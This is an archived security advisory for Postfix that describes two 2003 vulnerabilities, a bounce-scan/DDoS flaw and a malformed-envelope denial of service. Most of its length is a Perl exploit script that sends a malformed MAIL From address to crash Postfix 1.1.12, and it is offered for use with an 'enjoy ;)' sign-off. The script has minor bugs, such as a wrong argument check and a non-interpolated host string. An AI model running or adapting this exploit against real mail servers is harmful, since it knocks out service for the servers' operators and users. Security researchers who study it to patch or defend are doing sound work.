source: http://www.securityfocus.com/bid/8333/info
 
Debian has reported two vulnerabilities in the Postfix mail transfer agent. The first vulnerability, CAN-2003-0468, can allow for an adversary to "bounce-scan" a private network. It has also been reported that this vulnerability can be exploited to use the server as a distributed denial of service tool. These attacks are reportedly possible through forcing the server to connect to an arbitrary port on an arbitrary host.
 
The second vulnerability, CAN-2003-0540, is another denial of service. It can be triggered by a malformed envelope address and can cause the queue manager to lock up until the message is removed manually from the queue. It is also reportedly possible to lock the SMTP listener, also resulting in a denial of service.

#!/usr/bin/perl

#Remote Dos for postfix version 1.1.12
#tested on redhat 9.0, redhat 8.0, mandrake 9.0
#deadbeat,
#mail: daniels@legend.co.uk
#	 deadbeat@sdf.lonestar.org
#
#thanks..enjoy ;)

use IO::Socket;
if (!$ARGV[3]){
   die "Usage:perl $0 <subject> <data> <smtp host to use>\n";
}
$subject = $ARGV[0];
$junk = $ARGV[1];
$smtp_host = $ARGV[2];


$helo = "HELO $smtp_host\r\n";
$rcpt = "RCPT To:<nonexistant@127.0.0.1>\r\n";
$data = "DATA\n$junk\r\n";
$sub = "Subject: $subject\r\n";
$from = "MAIL From <.!@$smtp_host>\r\n";
print "Going to connect to $smtp_host\n";
$sox = IO::Socket::INET->new(
   Proto=> 'tcp',
   PeerPort=>'25',
   PeerAddr=>'$smtp_host',
);
print "Connected...\n";
print $sox $helo;
sleep 1;
print $sox $from;
sleep 1;
print $sox $rcpt;
sleep 1;
print $sox $sub;
sleep 1;
print $sox $data;
sleep 1;
print $sox ".\r\n\r\n";
sleep 1;
close $sox;
print "Done..should lock up Postfix 1.1.12 and below ;)\n\n";
